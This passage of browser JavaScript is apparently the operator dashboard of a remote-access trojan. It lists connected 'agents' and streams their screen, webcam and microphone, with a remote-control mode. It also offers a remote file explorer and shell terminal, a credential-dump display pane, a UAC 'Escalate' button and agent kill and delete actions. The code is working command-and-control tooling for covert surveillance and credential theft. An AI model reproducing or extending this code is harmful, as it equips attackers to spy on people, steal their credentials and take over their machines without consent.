                    // Attach to StudioAudioController DSP Graph
                    studioAudio.attachMediaStream(stream);
                    const dspVal = document.getElementById('audio-dsp-mode')?.value || 'studio';
                    studioAudio.setDspMode(dspVal);
                    const boostVal = parseFloat(document.getElementById('audio-volume-boost')?.value || '1.0');
                    studioAudio.setVolumeBoost(boostVal);
                }
            };

            if (streamType === 'screen') {
                try {
                    const controlChannel = pc.createDataChannel('control', { ordered: false, maxRetransmits: 0 });
                    activeWebRTC.screen.dataChannel = controlChannel;
                    controlChannel.onopen = () => {
                        console.log('⚡ WebRTC Control DataChannel opened (UDP low-latency control active)');
                    };
                } catch (dcErr) {
                    console.warn("Could not create control DataChannel:", dcErr);
                }
            }

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit('webrtc_ice_candidate', {
                        agent_id: state.selectedAgentId,
                        stream_type: streamType,
                        candidate: event.candidate.toJSON()
                    });
                }
            };

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);


            let offerSdp = offer.sdp;
            if (streamType === 'screen' || streamType === 'camera') {
                const sdpLines = offerSdp.split('\r\n');
                const enhancedLines = [];
                for (let line of sdpLines) {
                    enhancedLines.push(line);
                    if (line.startsWith('m=video')) {
                        enhancedLines.push('b=AS:35000');
                        enhancedLines.push('b=TIAS:35000000');
                        enhancedLines.push('a=x-google-min-bitrate=12000');
                        enhancedLines.push('a=x-google-start-bitrate=20000');
                        enhancedLines.push('a=x-google-max-bitrate=35000');
                    }
                }
                offerSdp = enhancedLines.join('\r\n');
            } else if (streamType === 'audio') {
                const sdpLines = offerSdp.split('\r\n');
                const enhancedLines = [];
                for (let line of sdpLines) {
                    enhancedLines.push(line);
                    if (line.startsWith('m=audio')) {
                        enhancedLines.push('b=AS:96');
                        enhancedLines.push('b=TIAS:96000');
                        enhancedLines.push('a=fmtp:111 minptime=10;useinbandfec=1;stereo=0;sprop-stereo=0;maxaveragebitrate=96000;usedtx=1;cbr=0');
                    }
                }
                offerSdp = enhancedLines.join('\r\n');
            }

            socket.emit('webrtc_offer', {
                agent_id: state.selectedAgentId,
                stream_type: streamType,
                sdp: offerSdp,
                params: params
            });

            showToast('info', `Initializing WebRTC ${streamType} stream...`);
            addLog(streamType, `Initiated WebRTC ${streamType} connection`);
        } catch (err) {
            console.error(`❌ WebRTC ${streamType} start error:`, err);
            showToast('error', `WebRTC ${streamType} failed: ${err.message}`);
        }
    }

    function stopWebRTCStream(streamType) {
        if (activeWebRTC[streamType] && activeWebRTC[streamType].timer) {
            clearInterval(activeWebRTC[streamType].timer);
            activeWebRTC[streamType].timer = null;
        }

        const badge = document.getElementById(`${streamType}-quality-badge`);
        if (badge) badge.style.display = 'none';
        const bitrateBadge = document.getElementById(`${streamType}-bitrate-badge`);
        if (bitrateBadge) bitrateBadge.style.display = 'none';

        if (activeWebRTC[streamType] && activeWebRTC[streamType].dataChannel) {
            try { activeWebRTC[streamType].dataChannel.close(); } catch (e) { }
            activeWebRTC[streamType].dataChannel = null;
        }

        if (activeWebRTC[streamType] && activeWebRTC[streamType].pc) {
            try {
                activeWebRTC[streamType].pc.close();
            } catch (e) { }
            activeWebRTC[streamType].pc = null;
        }
        if (activeWebRTC[streamType]) {
            activeWebRTC[streamType].active = false;
        }

        if (state.selectedAgentId) {
            socket.emit('stop_webrtc', {
                agent_id: state.selectedAgentId,
                stream_type: streamType
            });
        }

        if (streamType === 'screen') {
            state.remoteControlActive = false;
            const rcBtn = document.getElementById('btn-remote-control');
            if (rcBtn) {
                rcBtn.classList.remove('active');
                const rcLabel = document.getElementById('remote-control-label');
                if (rcLabel) rcLabel.textContent = 'Control: OFF';
                const rcIcon = document.getElementById('remote-control-icon');
                if (rcIcon) rcIcon.style.color = 'var(--text-muted)';
            }
            const rcHud = document.getElementById('remote-control-hud');
            if (rcHud) rcHud.style.display = 'none';

            if (screenFpsInterval) {
                clearInterval(screenFpsInterval);
                screenFpsInterval = null;
            }
            screenFrameCount = 0;
            const videoEl = document.getElementById('screen-video');
            const imgEl = document.getElementById('screen-img');
            const placeholder = document.getElementById('screen-placeholder');
            if (videoEl) {
                videoEl.classList.remove('remote-control-active');
                videoEl.style.display = 'none';
                try { videoEl.pause(); } catch (e) { }
                videoEl.srcObject = null;
                videoEl.removeAttribute('src');
            }
            if (imgEl) {
                imgEl.style.display = 'none';
                imgEl.removeAttribute('src');
                imgEl.src = '';
            }
            if (placeholder) {
                placeholder.style.display = 'flex';
            }
            const fpsEl = document.getElementById('screen-fps-live');
            if (fpsEl) { fpsEl.textContent = '0 FPS'; fpsEl.style.color = 'var(--text-muted)'; }
        } else if (streamType === 'camera') {
            if (cameraFpsInterval) {
                clearInterval(cameraFpsInterval);
                cameraFpsInterval = null;
            }
            cameraFrameCount = 0;
            const videoEl = document.getElementById('camera-video');
            const imgEl = document.getElementById('camera-img');
            const placeholder = document.getElementById('camera-placeholder');
            if (videoEl) {
                videoEl.style.display = 'none';
                try { videoEl.pause(); } catch (e) { }
                videoEl.srcObject = null;
                videoEl.removeAttribute('src');
            }
            if (imgEl) {
                imgEl.style.display = 'none';
                imgEl.removeAttribute('src');
                imgEl.src = '';
            }
            if (placeholder) {
                placeholder.style.display = 'flex';
            }
            const fpsEl = document.getElementById('camera-fps-live');
            if (fpsEl) { fpsEl.textContent = '0 FPS'; fpsEl.style.color = 'var(--text-muted)'; }
        } else if (streamType === 'audio') {
            const audioEl = document.getElementById('audio-player');
            if (audioEl) {
                try { audioEl.pause(); } catch (e) { }
                audioEl.srcObject = null;
                audioEl.removeAttribute('src');
            }
            studioAudio.stop();

            const audioBadge = document.getElementById('audio-stream-badge');
            if (audioBadge) audioBadge.style.display = 'none';
            const placeholder = document.getElementById('audio-visualizer-placeholder');
            const activeContainer = document.getElementById('audio-active-container');
            if (placeholder) placeholder.style.display = 'flex';
            if (activeContainer) activeContainer.style.display = 'none';
            const lvlFill = document.getElementById('audio-peak-meter-fill');
            const lvlText = document.getElementById('audio-db-meter-text');
            if (lvlFill) lvlFill.style.width = '0%';
            if (lvlText) lvlText.textContent = '-96.0 dBFS';

            const recordBtn = document.getElementById('record-audio-btn');
            if (recordBtn) {
                recordBtn.style.display = 'none';
                recordBtn.classList.remove('recording');
                const recordText = document.getElementById('record-audio-text');
                if (recordText) recordText.textContent = 'Record';
            }
        }
    }

    socket.on('webrtc_answer', async (data) => {
        if (data.agent_id !== state.selectedAgentId) return;
        const streamType = data.stream_type;
        const entry = activeWebRTC[streamType];
        if (entry && entry.pc && data.sdp) {
            try {
                await entry.pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: data.sdp }));
                entry.active = true;
                startTelemetryMonitor(streamType);
                showToast('success', `WebRTC ${streamType} stream active!`);
                addLog(streamType, `WebRTC ${streamType} connection established`);
            } catch (e) {
                console.error(`❌ WebRTC answer setRemoteDescription failed:`, e);
            }
        }
    });

    socket.on('webrtc_ice_candidate', async (data) => {
        if (data.agent_id !== state.selectedAgentId) return;
        const streamType = data.stream_type;
        const pc = activeWebRTC[streamType]?.pc;
        if (pc && data.candidate) {
            try {
                await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
            } catch (e) {
                console.error(`❌ Error adding WebRTC ICE candidate:`, e);
            }
        }
    });

    socket.on('screen_frame', (data) => {
        if (data.agent_id !== state.selectedAgentId) return;
        if (activeWebRTC.screen?.active) return; // WebRTC HD stream has priority!
        const btnStop = document.getElementById('btn-screen-stop');
        if (!btnStop || btnStop.style.display === 'none') return;
        const imgEl = document.getElementById('screen-img');
        const videoEl = document.getElementById('screen-video');
        const placeholder = document.getElementById('screen-placeholder');
        if (imgEl && data.image) {
            imgEl.src = 'data:image/jpeg;base64,' + data.image;
            imgEl.style.objectFit = 'contain';
            imgEl.style.display = 'block';
            if (videoEl) videoEl.style.display = 'none';
            if (placeholder) placeholder.style.display = 'none';
            screenFrameCount++;
            if (!screenFpsInterval) {
                screenFpsInterval = setInterval(() => {
                    const fpsEl = document.getElementById('screen-fps-live');
                    if (fpsEl) {
                        fpsEl.textContent = `${screenFrameCount} FPS`;
                        fpsEl.style.color = screenFrameCount > 0 ? '#4ade80' : 'var(--text-muted)';
                    }
                    screenFrameCount = 0;
                }, 1000);
            }
        }
    });

    socket.on('camera_frame', (data) => {
        if (data.agent_id !== state.selectedAgentId) return;
        if (activeWebRTC.camera?.active) return; // WebRTC HD stream has priority!
        const btnStop = document.getElementById('btn-camera-stop');
        if (!btnStop || btnStop.style.display === 'none') return;
        const imgEl = document.getElementById('camera-img');
        const videoEl = document.getElementById('camera-video');
        const placeholder = document.getElementById('camera-placeholder');
        if (imgEl && data.image) {
            imgEl.src = 'data:image/jpeg;base64,' + data.image;
            imgEl.style.objectFit = 'contain';
            imgEl.style.transform = (state.cameraMirrored !== false) ? 'scaleX(-1)' : 'none';
            imgEl.style.display = 'block';
            if (videoEl) videoEl.style.display = 'none';
            if (placeholder) placeholder.style.display = 'none';
            cameraFrameCount++;
            if (!cameraFpsInterval) {
                cameraFpsInterval = setInterval(() => {
                    const fpsEl = document.getElementById('camera-fps-live');
                    if (fpsEl) {
                        fpsEl.textContent = `${cameraFrameCount} FPS`;
                        fpsEl.style.color = cameraFrameCount > 0 ? '#4ade80' : 'var(--text-muted)';
                    }
                    cameraFrameCount = 0;
                }, 1000);
            }
        }
    });

    socket.on('audio_frame', (data) => {
        if (data.agent_id !== state.selectedAgentId) return;
        const btnStop = document.getElementById('btn-audio-stop');
        if (!btnStop || btnStop.style.display === 'none') return; // Stream is stopped
        if (!data.audio) return;

        const placeholder = document.getElementById('audio-visualizer-placeholder');
        const activeContainer = document.getElementById('audio-active-container');
        const audioBadge = document.getElementById('audio-stream-badge');
        if (audioBadge) audioBadge.style.display = 'inline-block';
        if (activeContainer && activeContainer.style.display === 'none') {
            activeContainer.style.display = 'flex';
            if (placeholder) placeholder.style.display = 'none';
        }

        const sampleRate = data.sample_rate || 48000;
        const channels = data.channels || 1;

        try {
            if (!pcmAudioCtx) {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                pcmAudioCtx = new AudioCtx({ sampleRate });
                pcmNextPlayTime = pcmAudioCtx.currentTime;

                // High-pass filter at 120Hz to eliminate low-frequency room rumble and AC hum
                pcmHpFilter = pcmAudioCtx.createBiquadFilter();
                pcmHpFilter.type = 'highpass';
                pcmHpFilter.frequency.value = 120;

                // Low-pass filter at 6500Hz to eliminate high-frequency static hiss
                pcmLpFilter = pcmAudioCtx.createBiquadFilter();
                pcmLpFilter.type = 'lowpass';
                pcmLpFilter.frequency.value = 6500;

                // Studio-grade Dynamic Vocal Compressor to normalize whisper vs loud speech & prevent clipping
                pcmCompressor = pcmAudioCtx.createDynamicsCompressor();
                pcmCompressor.threshold.setValueAtTime(-24, pcmAudioCtx.currentTime);
                pcmCompressor.knee.setValueAtTime(30, pcmAudioCtx.currentTime);
                pcmCompressor.ratio.setValueAtTime(12, pcmAudioCtx.currentTime);
                pcmCompressor.attack.setValueAtTime(0.003, pcmAudioCtx.currentTime);
                pcmCompressor.release.setValueAtTime(0.25, pcmAudioCtx.currentTime);

                pcmGainNode = pcmAudioCtx.createGain();
                const boost = parseFloat(document.getElementById('audio-volume-boost')?.value || '1.0');
                pcmGainNode.gain.value = boost;

                // Connect audio signal chain: Source -> HP -> LP -> Compressor -> Gain -> Destination
                pcmHpFilter.connect(pcmLpFilter);
                pcmLpFilter.connect(pcmCompressor);
                pcmCompressor.connect(pcmGainNode);
                pcmGainNode.connect(pcmAudioCtx.destination);
            } else if (pcmAudioCtx.state === 'suspended') {
                pcmAudioCtx.resume();
            }

            const binaryStr = atob(data.audio);
            const rawBytes = new Uint8Array(binaryStr.length);
            for (let i = 0; i < binaryStr.length; i++) {
                rawBytes[i] = binaryStr.charCodeAt(i);
            }

            const pcm16 = new Int16Array(rawBytes.buffer);
            if (pcm16.length === 0) return;

            const buffer = pcmAudioCtx.createBuffer(channels, Math.floor(pcm16.length / channels), sampleRate);
            for (let ch = 0; ch < channels; ch++) {
                const channelData = buffer.getChannelData(ch);
                for (let i = 0; i < channelData.length; i++) {
                    channelData[i] = pcm16[i * channels + ch] / 32768.0;
                }
            }

            const source = pcmAudioCtx.createBufferSource();
            source.buffer = buffer;
            source.connect(pcmHpFilter);

            if (pcmNextPlayTime < pcmAudioCtx.currentTime) {
                pcmNextPlayTime = pcmAudioCtx.currentTime + 0.01;
            }
            source.start(pcmNextPlayTime);
            pcmNextPlayTime += buffer.duration;
        } catch (err) {
            console.warn("PCM Audio playback error:", err);
        }
    });

    socket.on('agent_update', (data) => {
        if (data && data.agent_id) {
            state.agents[data.agent_id] = data;
            renderAgentList();
            renderConnectedDevices();
            updateCounters();
            if (state.selectedAgentId === data.agent_id) {
                updateActiveAgentDisplay();
            }
        }
    });

    socket.on('agent_deleted', (data) => {
        if (data && data.agent_id) {
            delete state.agents[data.agent_id];
            if (state.selectedAgentId === data.agent_id) {
                state.selectedAgentId = null;
            }
            renderAgentList();
            renderConnectedDevices();
            updateCounters();
        }
    });

    socket.on('command_result', (data) => {
        addLog('command', `Result for ${data.uuid.slice(0, 8)}: ${data.error ? 'FAILED' : 'OK'}`);

        let isObj = false;
        if (typeof data.result === 'string') {
            try {
                data.result = JSON.parse(data.result);
            } catch (e) { }
            // In case of double-encoded string
            if (typeof data.result === 'string' && (data.result.startsWith('{') || data.result.startsWith('['))) {
                try {
                    data.result = JSON.parse(data.result);
                } catch (e) { }
            }
        }
        if (typeof data.result === 'object' && data.result !== null) {
            isObj = true;
        }

        // If data.result is audio device list, populate audio device dropdown
        if (data.command === 'get_audio_devices' || data.command === 'audio_devices') {
            const refreshIcon = document.getElementById('refresh-audio-icon');
            if (refreshIcon) refreshIcon.classList.remove('ph-spin');
            const devSelect = document.getElementById('audio-device-select');
            let devList = data.result;
            if (typeof devList === 'string') {
                try { devList = JSON.parse(devList); } catch (e) { }
            }
            if (devSelect && Array.isArray(devList)) {
                const currentVal = devSelect.value;
                devSelect.innerHTML = '<option value="default">Default Mic</option>';
                devList.forEach(dev => {
                    const opt = document.createElement('option');
                    opt.value = dev.index;
                    opt.textContent = `${dev.name} (${dev.channels}ch)`;
                    if (dev.isDefault && (currentVal === 'default' || !currentVal)) opt.selected = true;
                    devSelect.appendChild(opt);
                });
                if (currentVal && currentVal !== 'default') {
                    devSelect.value = currentVal;
                }
                showToast('success', `Found ${devList.length} audio input device(s)`);
            }
        }

        // If data.result is a directory listing, update File Explorer right away
        if (isObj && data.result.files && Array.isArray(data.result.files)) {
            renderFilesTable(data.result.files, data.result.path || 'C:\\');
        }

        // If data.result is a downloaded file content, trigger browser download via Blob
        if (isObj && data.result.data && data.result.filename) {
            try {
                const byteCharacters = atob(data.result.data);
                const byteNumbers = new Uint8Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const blob = new Blob([byteNumbers], { type: 'application/octet-stream' });
                const blobUrl = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = blobUrl;
                a.download = data.result.filename;
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    if (document.body.contains(a)) document.body.removeChild(a);
                    URL.revokeObjectURL(blobUrl);
                }, 2000);
                showToast('success', `Downloaded ${data.result.filename}`);
            } catch (err) {
                console.error("Blob download error:", err);
                showToast('error', `Download error: ${err.message}`);
            }
        }

        // Handle file management operations auto-refresh & notifications
        const isFileAction = data.command && (
            data.command === 'file_rename' || data.command === 'rename' ||
            data.command === 'file_delete' || data.command === 'delete' ||
            data.command === 'file_upload' || data.command === 'upload' ||
            data.command === 'file_mkdir' || data.command === 'mkdir' || data.command === 'create_folder'
        );

        if (isFileAction) {
            const curPath = document.getElementById('file-current-path')?.value || 'C:\\';
            if (isObj && data.result.error) {
                showToast('error', `File error: ${data.result.error}`);
            } else if (!data.error) {
                if (data.command.includes('rename')) showToast('success', 'Item renamed successfully');
                else if (data.command.includes('delete')) showToast('success', 'Item deleted successfully');
                else if (data.command.includes('upload')) showToast('success', 'File uploaded successfully');
                else if (data.command.includes('mkdir')) showToast('success', 'Folder created successfully');
                requestFileList(curPath, false);
            }
        }

        // If data.result is a process listing, render in process table
        if (data.result && data.result.processes && Array.isArray(data.result.processes)) {
            renderProcessTable(data.result.processes);
        }

        // If data.result is a credential dump, render in Credential Dump pane table
        // We track the last command sent to know if a response is a dump
        if (data.result && typeof data.result === 'string' && data.result.includes('='.repeat(70))) {
            const dumpBody = document.getElementById('dump-table-body');
            const dumpHeader = document.getElementById('dump-status-header');
            const dumpCounter = document.getElementById('dump-counter');
            const dumpThead = document.getElementById('dump-table-head');

            if (dumpBody) {
                dumpBody.innerHTML = `<tr><td colspan="4" style="padding: 16px;"><pre style="font-family: monospace; white-space: pre-wrap; color: var(--text-primary); font-size: 13px;">${escapeHtml(data.result)}</pre></td></tr>`;
            }
            if (dumpThead) {
                dumpThead.style.display = 'none';
            }
            if (dumpHeader) {
                dumpHeader.innerHTML = `<i class="ph ph-check-circle" style="color: var(--accent-green);"></i> Dump Completed`;
            }
            if (dumpCounter) {
                dumpCounter.textContent = ``;
            }
            switchPane('dump');
            isObj = true; // prevent appending to terminal
        }

        // Append to terminal output for command responses or errors
        const isTerminalRelevant = (data.command === 'exec' || data.command === 'shell' || state.activeView === 'terminal');
        if (isTerminalRelevant && (data.error || (!isObj && data.result !== undefined))) {
            const output = document.getElementById('terminal-output');
            if (output) {
                const div = document.createElement('div');
                div.style.marginBottom = '6px';
                div.style.fontFamily = "'JetBrains Mono', monospace";
                div.style.fontSize = '0.85rem';

                if (data.error) {
                    div.innerHTML = `<span style="color: #f87171; font-weight: bold;">✗ Error:</span> <span style="color: #cbd5e1;">${escapeHtml(data.error)}</span>`;
                } else if (data.result !== undefined) {
                    const resultStr = typeof data.result === 'string' ? data.result : JSON.stringify(data.result, null, 2);

                    // If output looks like a path from `cd`, update terminal working directory
                    if (typeof data.result === 'string') {
                        const trimmed = data.result.trim();
                        if (/^[A-Za-z]:\\[^<>:"/\\|?*]*$/.test(trimmed) || trimmed.startsWith('/') || trimmed.startsWith('\\\\')) {
                            if (state.selectedAgentId) {
                                state.agentCwd = state.agentCwd || {};
                                state.agentCwd[state.selectedAgentId] = trimmed;
                                const promptCwd = document.getElementById('terminal-prompt-cwd');
                                const cwdBadge = document.getElementById('terminal-cwd-badge');
                                if (promptCwd) promptCwd.textContent = trimmed;
                                if (cwdBadge) cwdBadge.textContent = trimmed;
                            }
                        }
                    }

                    div.innerHTML = `<div style="color: #f1f5f9; line-height: 1.5; white-space: pre-wrap; word-break: break-word;">${parseAnsiToHtml(resultStr)}</div>`;
                }

                output.appendChild(div);
                output.scrollTop = output.scrollHeight;
            }
        }

        if (data.error) {
            showToast('error', `Command failed: ${data.error.slice(0, 60)}`);
        } else if (isObj && data.result && data.result.error) {
            showToast('error', `${data.result.error.slice(0, 80)}`);
        } else if (!isFileAction && !(isObj && data.result && data.result.data && data.result.filename)) {
            showToast('success', 'Command executed successfully');
        }
    });

    // Helper: Parse ANSI SGR escape codes to styled HTML
    function parseAnsiToHtml(text) {
        if (!text) return '';
        const ansiColorMap = {
            '30': '#1e293b', '31': '#f87171', '32': '#4ade80', '33': '#fbbf24',
            '34': '#60a5fa', '35': '#c084fc', '36': '#38bdf8', '37': '#f8fafc',
            '90': '#64748b', '91': '#ef4444', '92': '#22c55e', '93': '#f59e0b',
            '94': '#3b82f6', '95': '#a855f7', '96': '#06b6d4', '97': '#ffffff'
        };

        // Strip non-color ANSI escape sequences (cursor movement, clear screen, etc.)
        let clean = text.replace(/\x1b\[[0-9;]*[A-HJKSTfimnsu]/g, (match) => {
            if (match.endsWith('m')) return match; // Keep color codes
            return '';
        });

        // Escape standard HTML characters first
        let html = escapeHtml(clean);

        // Convert SGR color codes
        html = html.replace(/\x1b\[([0-9;]+)m/g, (match, codes) => {
            const codeList = codes.split(';');
            let styles = [];
            for (const code of codeList) {
                if (code === '0') return '</span>';
                if (code === '1') styles.push('font-weight: bold;');
                if (code === '4') styles.push('text-decoration: underline;');
                if (ansiColorMap[code]) styles.push(`color: ${ansiColorMap[code]};`);
            }
            if (styles.length > 0) {
                return `<span style="${styles.join(' ')}">`;
            }
            return '';
        });

        return html;
    }

    // ──────── SESSION TIMER ────────
    function updateSessionTimer() {
        const elapsed = Math.floor((Date.now() - state.sessionStart) / 1000);
        const hrs = String(Math.floor(elapsed / 3600)).padStart(2, '0');
        const mins = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
        const secs = String(elapsed % 60).padStart(2, '0');
        const el = document.getElementById('session-timer');
        if (el) el.textContent = `${hrs}:${mins}:${secs}`;
    }
    setInterval(updateSessionTimer, 1000);

    // ──────── WS STATUS ────────
    function updateWsStatus(connected) {
        const dot = document.getElementById('ws-status');
        const text = document.getElementById('ws-status-text');
        if (!dot || !text) return;
        if (connected) {
            dot.classList.add('connected');
            text.textContent = 'Connected';
        } else {
            dot.classList.remove('connected');
            text.textContent = 'Disconnected';
        }
    }

    // ──────── COUNTERS ────────
    function updateCounters() {
        const agentArr = Object.values(state.agents);
        const online = agentArr.filter(a => a.online).length;
        const el = (id) => document.getElementById(id);
        if (el('count-online')) el('count-online').textContent = online;
        if (el('count-total')) el('count-total').textContent = agentArr.length;
    }

    // ──────── NOTIFICATION BADGE ────────
    function updateNotifBadge() {
        const badge = document.getElementById('notif-badge');
        if (!badge) return;
        badge.textContent = state.notifCount;
        badge.style.display = state.notifCount > 0 ? 'flex' : 'none';
    }

    // ──────── AGENT LIST ────────
    function renderAgentList() {
        const ul = document.getElementById('agent-list');
        const emptyEl = document.getElementById('agent-empty');
        if (!ul) return;

        const search = (document.getElementById('agent-search')?.value || '').toLowerCase();
        const filter = state.currentFilter;

        const agentArr = Object.values(state.agents).filter(a => {
            const matchSearch = (a.hostname || '').toLowerCase().includes(search) ||
                (a.agent_id || '').toLowerCase().includes(search) ||
                (a.os || '').toLowerCase().includes(search);
            const matchFilter = filter === 'all' ||
                (filter === 'online' && a.online) ||
                (filter === 'offline' && !a.online);
            return matchSearch && matchFilter;
        });

        const currentIds = Array.from(ul.children).map(li => li.dataset.id);
        const newIds = agentArr.map(a => a.agent_id);
        const needsFullRebuild = currentIds.length !== newIds.length || currentIds.some((id, i) => id !== newIds[i]);

        if (needsFullRebuild) {
            ul.innerHTML = '';
            agentArr.forEach(a => {
                const li = document.createElement('li');
                li.dataset.id = a.agent_id;
                li.className = `${a.online ? 'online' : ''} ${state.selectedAgentId === a.agent_id ? 'selected' : ''}`;
                const osIcon = getOsIcon(a.os);
                li.innerHTML = `
                    <div class="agent-avatar">
                        <i class="ph ph-${osIcon}"></i>
                    </div>
                    <div class="agent-info">
                        <div class="agent-name">${escapeHtml(a.hostname || 'Unknown')}</div>
                        <div class="agent-meta">
                            <span>${escapeHtml(a.os || '?')} · ${escapeHtml(a.ip || '?.?.?.?')}</span>
                        </div>
                    </div>
                    <div class="agent-status-dot ${a.online ? 'online' : 'offline'}"></div>
                `;
                li.addEventListener('click', () => selectAgent(a.agent_id));
                li.addEventListener('contextmenu', (e) => showContextMenu(e, a.agent_id));
                ul.appendChild(li);
            });
        } else {
            agentArr.forEach((a, i) => {
                const li = ul.children[i];
                if (!li) return;
                li.className = `${a.online ? 'online' : ''} ${state.selectedAgentId === a.agent_id ? 'selected' : ''}`;
                const nameEl = li.querySelector('.agent-name');
                const metaEl = li.querySelector('.agent-meta span');
                const dotEl = li.querySelector('.agent-status-dot');
                if (nameEl) nameEl.textContent = a.hostname || 'Unknown';
                if (metaEl) metaEl.textContent = `${a.os || '?'} · ${a.ip || '?.?.?.?'}`;
                if (dotEl) dotEl.className = `agent-status-dot ${a.online ? 'online' : 'offline'}`;
            });
        }

        if (emptyEl) {
            emptyEl.style.display = agentArr.length === 0 ? 'block' : 'none';
        }
        renderDevicesGrid();
    }

    function renderDevicesGrid() {
        const grid = document.getElementById('devices-grid');
        if (!grid) return;

        const search = (document.getElementById('agent-search')?.value || '').toLowerCase();
        const filter = state.currentFilter;
        const agentArr = Object.values(state.agents).filter(a => {
            const matchSearch = (a.hostname || '').toLowerCase().includes(search) ||
                (a.agent_id || '').toLowerCase().includes(search) ||
                (a.os || '').toLowerCase().includes(search);
            const matchFilter = filter === 'all' ||
                (filter === 'online' && a.online) ||
                (filter === 'offline' && !a.online);
            return matchSearch && matchFilter;
        });

        if (agentArr.length === 0) {
            grid.innerHTML = '';
            return;
        }

        const currentCards = Array.from(grid.querySelectorAll('.device-card'));
        const currentIds = currentCards.map(c => c.dataset.id);
        const newIds = agentArr.map(a => a.agent_id);
        const needsFullRebuild = currentIds.length !== newIds.length || currentIds.some((id, i) => id !== newIds[i]) || grid.querySelector('[data-action="terminal"]');

        if (needsFullRebuild) {
            grid.innerHTML = agentArr.map(a => {
                const osIcon = getOsIcon(a.os);
                const isSelected = state.selectedAgentId === a.agent_id;
                return `
                <div class="device-card ${isSelected ? 'selected' : ''}" data-id="${escapeHtml(a.agent_id)}">
                    <div class="device-card-header">
                        <div class="device-header-left">
                            <div class="device-os-icon">
                                <i class="ph ph-${osIcon}"></i>
                            </div>
                            <span class="device-hostname">${escapeHtml(a.hostname || 'Unknown Host')}</span>
                        </div>
                        <span class="device-online-dot ${a.online ? 'online' : 'offline'}" title="${a.online ? 'Online' : 'Offline'}"></span>
                    </div>
                    <div class="device-specs">
                        <div class="device-spec-row">
                            <span>IP Address:</span>
                            <span style="color: var(--text-primary); font-weight: 600;" class="spec-ip">${escapeHtml(a.ip || '127.0.0.1')}</span>
                        </div>
                        <div class="device-spec-row">
                            <span>OS:</span>
                            <span style="color: var(--text-primary);" class="spec-os">${escapeHtml(formatOsString(a))}</span>
                        </div>
                        <div class="device-spec-row">
                            <span>CPU / RAM:</span>
                            <span style="color: var(--text-primary);" class="spec-cpu">${escapeHtml(a.cpu || 'Unknown CPU')} · ${formatRamShort(a.ram)}</span>
                        </div>
                    </div>
                    <div class="device-actions">
                        ${a.online ? `
                        <button class="dev-btn dev-action-btn" data-action="elevate" data-id="${escapeHtml(a.agent_id)}" title="Request UAC Elevation">
                            <i class="ph ph-arrow-fat-lines-up"></i> Escalate
                        </button>
                        <button class="dev-btn dev-action-btn" data-action="kill" data-id="${escapeHtml(a.agent_id)}" title="Kill Agent Process" style="color: var(--accent-red); border-color: rgba(239, 68, 68, 0.4);">
                            <i class="ph ph-skull"></i> Kill
                        </button>
                        <button class="dev-btn dev-action-btn" data-action="rename" data-id="${escapeHtml(a.agent_id)}" title="Rename Host / Custom Alias" style="color: #38bdf8; border-color: rgba(56, 189, 248, 0.4);">
                            <i class="ph ph-pencil-simple"></i> Rename
                        </button>
                        ` : `
                        <button class="dev-btn dev-action-btn" data-action="delete" data-id="${escapeHtml(a.agent_id)}" title="Delete Agent Permanently" style="color: var(--accent-red); border-color: rgba(239, 68, 68, 0.4);">
                            <i class="ph ph-trash"></i> Delete
                        </button>
                        <span style="color: var(--text-muted); font-size: 12px; font-weight: 500; display: flex; align-items: center; gap: 6px; padding: 4px 8px; background: rgba(255,255,255,0.03); border-radius: 8px;">
                            <i class="ph ph-warning-circle" style="color: var(--accent-red);"></i> Offline
                        </span>
                        `}
                    </div>
                </div>
                `;
            }).join('');

            grid.querySelectorAll('.device-card').forEach(card => {
                card.addEventListener('click', (e) => {
                    if (e.target.closest('.dev-action-btn')) return;
                    selectAgent(card.dataset.id);
                });
            });

            grid.querySelectorAll('.dev-action-btn').forEach(btn => {
                btn.addEventListener('click', async (e) => {
                    e.stopPropagation();
                    const id = btn.dataset.id;
                    const action = btn.dataset.action;
                    if (action === 'elevate') {
                        sendCommand(id, 'elevate');
                        showToast('info', `UAC Elevation request sent to agent ${id.slice(0, 8)}...`);
                    } else if (action === 'kill') {
                        const confirmOk = await showCustomConfirm({
                            title: 'Terminate Agent (2FA Verified)',
                            subtitle: 'Device Operations',
                            message: `Enter Google Authenticator 2FA code to confirm killing agent ${id.slice(0, 8)}:`,
                            icon: 'ph-warning-octagon',
                            confirmText: 'Verify & Terminate Agent',
                            isDanger: true,
                            requireTotp: true
                        });
                        if (confirmOk) {
                            sendCommand(id, 'kill');
                            showToast('warning', `Terminating agent process ${id.slice(0, 8)}...`);
                            setTimeout(() => {
                                fetch(`/api/agents/${id}`, {
                                    method: 'DELETE',
                                    headers: { 'X-CSRFToken': getCsrfToken() }
                                }).then(() => {
                                    delete state.agents[id];
                                    if (state.selectedAgentId === id) {
                                        state.selectedAgentId = null;
                                    }
                                    renderConnectedDevices();
                                    renderAgentList();
                                    updateCounters();
                                    showToast('success', `Agent ${id.slice(0, 8)} terminated and removed.`);
                                }).catch(() => { });
                            }, 500);
                        }
                    } else if (action === 'rename') {
                        const currentName = state.agents[id]?.custom_name || state.agents[id]?.hostname || id.slice(0, 8);
                        const newName = await showCustomPrompt({
                            title: 'Rename Device / Host',
                            subtitle: 'Device Customization',
                            message: `Enter new display name for "${currentName}":`,
                            defaultValue: currentName,
                            placeholder: 'e.g. My Laptop / Office-PC / Target-Server',
                            icon: 'ph-pencil-simple',
                            confirmText: 'Save Name'
                        });
                        if (newName !== null && newName.trim() !== '') {
                            const trimmed = newName.trim();
                            if (state.agents[id]) {
                                state.agents[id].hostname = trimmed;
                                state.agents[id].custom_name = trimmed;
                            }
                            socket.emit('rename_agent', { agent_id: id, new_name: trimmed });
                            fetch(`/api/agents/${id}/rename`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                    'X-CSRFToken': getCsrfToken()
                                },
                                body: JSON.stringify({ new_name: trimmed })
                            }).catch(() => { });
                            renderConnectedDevices();
                            renderAgentList();
                            updateActiveAgentDisplay();
                            showToast('success', `Device renamed to "${trimmed}"`);
